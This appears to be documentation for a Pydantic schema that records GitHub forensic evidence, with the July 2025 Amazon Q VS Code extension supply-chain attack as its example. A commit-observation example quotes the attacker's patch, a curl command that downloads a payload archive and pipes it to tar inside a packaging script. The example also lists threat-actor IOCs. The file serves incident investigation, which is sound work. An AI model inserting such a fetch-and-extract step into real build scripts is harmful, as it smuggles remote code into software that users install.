---
name: github-forensics-schema
description: Pydantic schema for GitHub forensic evidence. Event (when/who/what) and Observation (original + observer perspectives).
version: 4.0
author: mbrg
tags: [github, forensics, schema, pydantic, osint]
---

# GitHub Forensics Evidence Schema

Evidence is created ONLY through the `EvidenceFactory` which fetches data from
trusted third-party sources. Direct instantiation of data classes is not possible.

## Quick Start

```python
from src import EvidenceFactory, load_evidence_from_json, IOCType

factory = EvidenceFactory()

# Fetch from GitHub API (verified)
commit = factory.commit("aws", "aws-toolkit-vscode", "678851b...")
pr = factory.pull_request("aws", "aws-toolkit-vscode", 7710)

# Fetch from GH Archive BigQuery (verified)
events = factory.events_from_gharchive(from_date="20250713", repo="aws/aws-toolkit-vscode")

# Create IOC (verifies value exists in source URL)
ioc = factory.ioc(IOCType.COMMIT_SHA, "678851b...", source_url="https://mbgsec.com/...")

# Create article observation
article = factory.article(url="https://...", title="...", author="...")

# Load previously saved evidence from JSON
evidence = load_evidence_from_json(json_data)
```

## Two Evidence Types

```
EVENT - Something that happened
├── when: when it happened
├── who: who did it
├── what: what they did
└── Sources: GH Archive, git

OBSERVATION - Something we observed
├── original_when: when it actually happened (if known)
├── original_who: who actually did it (if known)
├── original_what: what actually happened (if known)
├── observed_when: when we/they found it
├── observed_by: who observed (wayback, vendor, github)
├── observed_what: what was found
└── Sources: GitHub, Wayback, security vendors
```

## Sources

| Source | For |
|--------|-----|
| `GHARCHIVE` | Events (BigQuery) |
| `GIT` | Events (local git) |
| `GITHUB` | Observations (API/web) |
| `WAYBACK` | Observations (archive.org) |
| `SECURITY_VENDOR` | Observations/IOCs (blogs) |

## Events

| Type | What |
|------|------|
| `PushEvent` | Pushed commits |
| `PullRequestEvent` | PR action |
| `IssueEvent` | Issue action |
| `IssueCommentEvent` | Comment |
| `CreateEvent` | Branch/tag created |
| `DeleteEvent` | Branch/tag deleted |
| `ForkEvent` | Repo forked |
| `WorkflowRunEvent` | GitHub Actions |
| `ReleaseEvent` | Release |
| `WatchEvent` | Starred |
| `MemberEvent` | Collaborator |
| `PublicEvent` | Made public |

## Observations

All observations have `is_deleted: bool` property.

| Type | What |
|------|------|
| `CommitObservation` | Commit (has `is_dangling` for orphan commits) |
| `IssueObservation` | Issue or PR |
| `FileObservation` | File content |
| `WikiObservation` | Wiki page |
| `ForkObservation` | Fork relationship |
| `BranchObservation` | Branch |
| `TagObservation` | Tag |
| `ReleaseObservation` | Release |
| `SnapshotObservation` | Wayback snapshots |
| `IOC` | Indicator of Compromise |
| `ArticleObservation` | Blog post/security report |

## IOC Types

`commit_sha`, `file_path`, `file_hash`, `code_snippet`, `email`, `username`, `repository`, `tag_name`, `branch_name`, `workflow_name`, `ip_address`, `domain`, `url`, `api_key`, `secret`

## Real-World Example: Amazon Q Supply Chain Attack

Timeline evidence from the July 2025 Amazon Q prompt infection investigation.

**Note:** The examples below show the structure of evidence objects returned by the factory.
All evidence is created through `EvidenceFactory` only.

### Events from GH Archive

```python
# Fetch events from GH Archive via factory
factory = EvidenceFactory()
events = factory.events_from_gharchive(from_date="20250713", repo="aws/aws-toolkit-vscode")

# Events have this structure:

# Deleted issue created by threat actor
IssueEvent(
    evidence_id=_generate_evidence_id("issue", "aws/aws-toolkit-vscode", "7651", "opened"),
    when=datetime(2025, 7, 13, 7, 52, 36, tzinfo=timezone.utc),
    who=GitHubActor(login="lkmanka58"),
    what="Issue #7651 opened",
    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
    verification=VerificationInfo(
        source=EvidenceSource.GHARCHIVE,
        bigquery_table="githubarchive.day.20250713",
        query="repo.name='aws/aws-toolkit-vscode' AND type='IssuesEvent' AND actor.login='lkmanka58'",
    ),
    action=IssueAction.OPENED,
    issue_number=7651,
    issue_title="aws amazon donkey aaaaaaiii aaaaaaaiii",
    issue_body="[Recovered from GH Archive - issue deleted from GitHub]",
)

# Malicious tag creation
CreateEvent(
    evidence_id=_generate_evidence_id("create", "aws/aws-toolkit-vscode", "tag", "stability"),
    when=datetime(2025, 7, 13, 19, 41, 44, tzinfo=timezone.utc),
    who=GitHubActor(login="aws-toolkit-automation"),
    what="Created tag 'stability'",
    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
    verification=VerificationInfo(
        source=EvidenceSource.GHARCHIVE,
        bigquery_table="githubarchive.day.20250713",
        query="repo.name='aws/aws-toolkit-vscode' AND type='CreateEvent' AND ref='stability'",
    ),
    ref_type=RefType.TAG,
    ref_name="stability",
)

# Infected release
ReleaseEvent(
    evidence_id=_generate_evidence_id("release", "aws/aws-toolkit-vscode", "v1.84.0"),
    when=datetime(2025, 7, 17, 20, 29, 22, tzinfo=timezone.utc),
    who=GitHubActor(login="aws-toolkit-automation"),
    what="Release 'v1.84.0' published",
    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
    verification=VerificationInfo(source=EvidenceSource.GHARCHIVE, bigquery_table="githubarchive.day.20250717"),
    action="published",
    tag_name="v1.84.0",
    release_name="Amazon Q for VS Code v1.84.0",
)
```

### Observations

```python
# Malicious commit with file changes
CommitObservation(
    evidence_id=_generate_evidence_id("commit", "aws/aws-toolkit-vscode", "678851bbe9776228f55e0460e66a6167ac2a1685"),
    original_when=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
    original_who=GitHubActor(login="lkmanka58"),
    original_what="Malicious downloader added to packaging script",
    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
    observed_by=EvidenceSource.GITHUB,
    observed_what="Commit 678851b observed via GitHub API",
    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
    verification=VerificationInfo(
        source=EvidenceSource.GITHUB,
        url="https://github.com/aws/aws-toolkit-vscode/commit/678851bbe9776228f55e0460e66a6167ac2a1685",
    ),
    sha="678851bbe9776228f55e0460e66a6167ac2a1685",
    message="fix(amazonq): stability packaging update",
    author=CommitAuthor(
        name="lkmanka58",
        email="lkmanka58@users.noreply.github.com",
        date=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
    ),
    committer=CommitAuthor(
        name="lkmanka58",
        email="lkmanka58@users.noreply.github.com",
        date=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
    ),
    files=[
        FileChange(
            filename="scripts/package.sh",
            status="modified",
            additions=5,
            deletions=1,
            patch='@@ -10,1 +10,5 @@\n-# build step\n+curl -sSL "https://github.com/.../stability/payload.tar.gz" | tar xz',
        )
    ],
)

# Deleted issue recovered from GH Archive
IssueObservation(
    evidence_id=_generate_evidence_id("issue-obs", "aws/aws-toolkit-vscode", "7651"),
    original_when=datetime(2025, 7, 13, 7, 52, 36, tzinfo=timezone.utc),
    original_who=GitHubActor(login="lkmanka58"),
    original_what="Issue #7651 opened - complaint about Amazon Q",
    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
    observed_by=EvidenceSource.GHARCHIVE,
    observed_what="Issue #7651 content recovered from GH Archive (deleted from GitHub)",
    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
    verification=VerificationInfo(
        source=EvidenceSource.GHARCHIVE,
        bigquery_table="githubarchive.day.20250713",
        query="repo.name='aws/aws-toolkit-vscode' AND type='IssuesEvent' AND JSON_EXTRACT_SCALAR(payload, '$.issue.number')='7651'",
    ),
    issue_number=7651,
    title="aws amazon donkey aaaaaaiii aaaaaaaiii",
    body="Full text of the deleted issue recovered from GitHub Archive...",
    state="closed",
    is_deleted=True,
)

# Blog post documenting the incident
ArticleObservation(
    evidence_id=_generate_evidence_id("article", "https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/"),
    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
    observed_by=EvidenceSource.SECURITY_VENDOR,
    observed_what="Article: Constructing a Timeline for Amazon Q Prompt Infection",
    verification=VerificationInfo(
        source=EvidenceSource.SECURITY_VENDOR,
        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
    ),
    url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
    title="Constructing a Timeline for Amazon Q Prompt Infection",
    author="Michael Bargury",
    published_date=datetime(2025, 7, 24, tzinfo=timezone.utc),
    source_name="mbgsec.com",
    summary="Timeline reconstruction of the Amazon Q VS Code extension supply chain attack using GH Archive forensics.",
)
```

### IOCs

```python
# Malicious commit SHA
IOC(
    evidence_id=_generate_evidence_id("ioc", "commit_sha", "678851bbe9776228f55e0460e66a6167ac2a1685"),
    original_when=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
    original_who=GitHubActor(login="lkmanka58"),
    original_what="Malicious commit pushed to master",
    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
    observed_by=EvidenceSource.SECURITY_VENDOR,
    observed_what="Malicious commit SHA reported",
    verification=VerificationInfo(
        source=EvidenceSource.SECURITY_VENDOR,
        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
    ),
    ioc_type=IOCType.COMMIT_SHA,
    value="678851bbe9776228f55e0460e66a6167ac2a1685",
    first_seen=datetime(2025, 7, 13, 20, 30, 24, tzinfo=timezone.utc),
    last_seen=datetime(2025, 7, 18, 23, 21, 3, tzinfo=timezone.utc),
)

# Threat actor username
IOC(
    evidence_id=_generate_evidence_id("ioc", "username", "lkmanka58"),
    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
    observed_by=EvidenceSource.SECURITY_VENDOR,
    observed_what="Threat actor username identified",
    verification=VerificationInfo(
        source=EvidenceSource.SECURITY_VENDOR,
        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
    ),
    ioc_type=IOCType.USERNAME,
    value="lkmanka58",
)

# Malicious tag (deleted)
IOC(
    evidence_id=_generate_evidence_id("ioc", "tag_name", "stability"),
    original_when=datetime(2025, 7, 13, 19, 41, 44, tzinfo=timezone.utc),
    observed_when=datetime(2025, 7, 24, 12, 0, 0, tzinfo=timezone.utc),
    observed_by=EvidenceSource.SECURITY_VENDOR,
    observed_what="Malicious payload delivery tag identified",
    repository=GitHubRepository(owner="aws", name="aws-toolkit-vscode", full_name="aws/aws-toolkit-vscode"),
    verification=VerificationInfo(
        source=EvidenceSource.SECURITY_VENDOR,
        url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
    ),
    ioc_type=IOCType.TAG_NAME,
    value="stability",
    is_deleted=True,
)
```

## Creating Evidence

All evidence is created through `EvidenceFactory`. This ensures data is fetched
from trusted third-party sources and cannot be fabricated.

### Via EvidenceFactory

```python
from src import EvidenceFactory, IOCType

factory = EvidenceFactory()

# Fetch commit observation from GitHub API
commit = factory.commit("aws", "aws-toolkit-vscode", "678851bbe9776228f55e0460e66a6167ac2a1685")

# Fetch issue/PR from GitHub API
pr = factory.pull_request("aws", "aws-toolkit-vscode", 7710)

# Create article observation
article = factory.article(
    url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
    title="Constructing a Timeline for Amazon Q Prompt Infection",
    author="Michael Bargury",
    source_name="mbgsec.com",
)

# Create IOC (verifies value exists in source URL)
ioc = factory.ioc(
    ioc_type=IOCType.COMMIT_SHA,
    value="678851bbe9776228f55e0460e66a6167ac2a1685",
    source_url="https://mbgsec.com/posts/2025-07-24-constructing-a-timeline-for-amazon-q-prompt-infection/",
)

# Query GH Archive for events (requires BigQuery credentials)
events = factory.events_from_gharchive(
    from_date="20250713",
    repo="aws/aws-toolkit-vscode",
    actor="lkmanka58",
)
```

### Loading from JSON (deserialization)

```python
from src import load_evidence_from_json
import json

# Load previously serialized evidence
with open("evidence.json") as f:
    data = json.load(f)

evidence = load_evidence_from_json(data)  # Returns correct Event/Observation type
```

### Type Hints Only

For type annotations without instantiation:

```python
from src.types import CommitObservation, IssueEvent

def analyze_commit(commit: CommitObservation) -> str:
    return f"Commit {commit.sha[:8]} by {commit.author.name}"
```

## JSON Export

All evidence types serialize to JSON:

```python
import json

evidence = [commit, pr, article]
output = json.dumps([e.model_dump() for e in evidence], indent=2, default=str)
```
